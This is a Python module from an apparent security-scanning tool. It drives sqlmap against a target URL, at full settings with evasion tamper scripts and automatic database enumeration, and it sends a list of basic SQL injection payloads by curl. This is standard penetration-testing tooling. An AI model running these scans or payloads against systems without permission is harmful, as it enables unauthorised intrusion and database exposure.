"""
SQL Injection Module — Cyberburg
Handles: SQLMap integration with various injection methods
"""

import re
from utils.helpers import run_command, get_timestamp
from utils.tool_checker import check_tool
from utils.banner import print_info, print_success, print_warning, print_error
from rich.console import Console

console = Console()


def sqlmap_quick(target: str) -> dict:
    """Quick SQLMap scan on target URL."""
    result = {
        "module": "SQL Injection Scan (Quick)",
        "target": target,
        "timestamp": get_timestamp(),
        "raw": "",
        "vulnerable": False,
        "findings": []
    }

    if not check_tool("sqlmap"):
        print_warning("sqlmap not found — skipping SQL injection scan")
        return result

    print_info(f"Running SQLMap quick scan on {target}...")

    code, stdout, stderr = run_command(
        [
            "sqlmap", "-u", target,
            "--batch",              # Non-interactive
            "--level", "2",
            "--risk", "1",
            "--timeout", "10",
            "--retries", "2",
            "--output-dir", "/tmp/cyberburg_sqlmap",
            "--forms",              # Test forms
            "--crawl", "1",
            "--random-agent",
            "--no-cast",
        ],
        timeout=300
    )

    result["raw"] = stdout + stderr
    result = _parse_sqlmap_output(stdout + stderr, result)
    return result


def sqlmap_full(target: str) -> dict:
    """Full SQLMap scan with all techniques."""
    result = {
        "module": "SQL Injection Scan (Full)",
        "target": target,
        "timestamp": get_timestamp(),
        "raw": "",
        "vulnerable": False,
        "findings": []
    }

    if not check_tool("sqlmap"):
        print_warning("sqlmap not found — skipping SQL injection scan")
        return result

    print_info(f"Running SQLMap FULL scan on {target} (this may take a while)...")

    code, stdout, stderr = run_command(
        [
            "sqlmap", "-u", target,
            "--batch",
            "--level", "5",
            "--risk", "3",
            "--technique", "BEUSTQ",   # All techniques
            "--forms",
            "--crawl", "3",
            "--random-agent",
            "--dbs",                   # Try to enumerate databases
            "--tamper", "space2comment,between,randomcase",
            "--output-dir", "/tmp/cyberburg_sqlmap_full",
            "--timeout", "15",
        ],
        timeout=600
    )

    result["raw"] = stdout + stderr
    result = _parse_sqlmap_output(stdout + stderr, result)

    # Try to dump if vulnerable
    if result["vulnerable"]:
        print_warning("SQL injection confirmed — attempting database enumeration...")
        code2, stdout2, _ = run_command(
            [
                "sqlmap", "-u", target,
                "--batch", "--dbs",
                "--level", "3", "--risk", "2",
                "--random-agent",
                "--output-dir", "/tmp/cyberburg_sqlmap_dump",
            ],
            timeout=300
        )
        result["raw"] += f"\n=== DB Enumeration ===\n{stdout2}"

        # Extract DB names
        dbs = re.findall(r'\[\*\]\s+(\w+)', stdout2)
        for db in dbs:
            result["findings"].append({
                "type": "Database Enumerated",
                "value": f"Database found: {db}",
                "severity": "CRITICAL"
            })

    return result


def sqlmap_post(target: str, data: str) -> dict:
    """SQLMap scan on POST data."""
    result = {
        "module": "SQL Injection (POST)",
        "target": target,
        "timestamp": get_timestamp(),
        "raw": "",
        "vulnerable": False,
        "findings": []
    }

    if not check_tool("sqlmap"):
        print_warning("sqlmap not found")
        return result

    print_info(f"Testing POST parameters for SQL injection on {target}...")

    code, stdout, stderr = run_command(
        [
            "sqlmap", "-u", target,
            "--data", data,
            "--batch",
            "--level", "3",
            "--risk", "2",
            "--random-agent",
            "--output-dir", "/tmp/cyberburg_sqlmap_post",
        ],
        timeout=300
    )

    result["raw"] = stdout + stderr
    result = _parse_sqlmap_output(stdout + stderr, result)
    return result


def manual_sqli_test(target: str) -> dict:
    """
    Manual SQL injection probing using curl payloads.
    Tests for error-based SQLi without sqlmap.
    """
    result = {
        "module": "Manual SQL Injection Probe",
        "target": target,
        "timestamp": get_timestamp(),
        "raw": "",
        "findings": []
    }

    if not check_tool("curl"):
        return result

    print_info(f"Manual SQL injection probing on {target}...")

    # SQL error signatures
    sql_errors = [
        "SQL syntax", "mysql_fetch", "You have an error in your SQL",
        "ORA-", "Oracle error", "Microsoft OLE DB", "ODBC SQL Server",
        "Unclosed quotation mark", "SQLite/JDBCDriver",
        "PostgreSQL ERROR", "supplied argument is not a valid PostgreSQL",
        "quoted string not properly terminated", "pg_query()",
        "mysql_num_rows()", "Warning: mysql", "mysqli_",
        "SQLSTATE", "syntax error", "DB Error:",
    ]

    payloads = [
        "'",
        "\"",
        "'--",
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND SLEEP(3)--",
        "'; SELECT 1--",
        "1 UNION SELECT NULL--",
        "' UNION SELECT NULL--",
        "%27",
        "\\x27",
    ]

    for payload in payloads:
        test_url = f"{target}?id={payload}" if '?' not in target else f"{target}&test={payload}"
        code, stdout, _ = run_command(
            ["curl", "-sL", "--max-time", "10", test_url],
            timeout=20
        )
        result["raw"] += f"=== Payload: {payload} ===\n{stdout[:500]}\n\n"

        for error in sql_errors:
            if error.lower() in stdout.lower():
                result["findings"].append({
                    "type": "SQL Injection Error Response",
                    "value": f"SQL error triggered with payload '{payload}': Found '{error}' in response",
                    "severity": "CRITICAL"
                })
                print_error(f"CRITICAL: SQL injection error with payload: {payload}")
                break

    if not result["findings"]:
        result["findings"].append({
            "type": "SQL Injection Error-Based",
            "value": "No obvious SQL errors triggered with basic payloads",
            "severity": "INFO"
        })

    return result


def _parse_sqlmap_output(output: str, result: dict) -> dict:
    """Parse SQLMap output and extract findings."""
    # Vulnerable parameter detection
    if "is vulnerable" in output or "sqlmap identified" in output:
        result["vulnerable"] = True

        # Extract parameter names
        params = re.findall(r"Parameter '(\w+)'", output)
        for param in set(params):
            result["findings"].append({
                "type": "SQL Injection Vulnerable Parameter",
                "value": f"Parameter '{param}' is vulnerable to SQL injection",
                "severity": "CRITICAL"
            })
            print_error(f"CRITICAL: SQL injection in parameter '{param}'!")

        # Extract injection types
        types = re.findall(r'Type: (.+)', output)
        for t in types:
            result["findings"].append({
                "type": "SQLi Injection Type",
                "value": t.strip(),
                "severity": "CRITICAL"
            })

        # Extract payload
        payloads = re.findall(r'Payload: (.+)', output)
        for p in payloads[:3]:
            result["findings"].append({
                "type": "SQLi Working Payload",
                "value": p.strip(),
                "severity": "CRITICAL"
            })

    elif "does not seem to be injectable" in output:
        result["findings"].append({
            "type": "SQL Injection",
            "value": "Target does not appear to be vulnerable to SQL injection (basic tests)",
            "severity": "INFO"
        })

    # Check for DB user / version info
    dbms_match = re.search(r"back-end DBMS: (.+)", output)
    if dbms_match:
        result["findings"].append({
            "type": "DBMS Identified",
            "value": f"Database system: {dbms_match.group(1).strip()}",
            "severity": "HIGH"
        })

    # Check for OS command execution
    if "os-shell" in output.lower() or "command execution" in output.lower():
        result["findings"].append({
            "type": "OS Command Execution via SQLi",
            "value": "SQL injection may allow OS command execution!",
            "severity": "CRITICAL"
        })

    return result
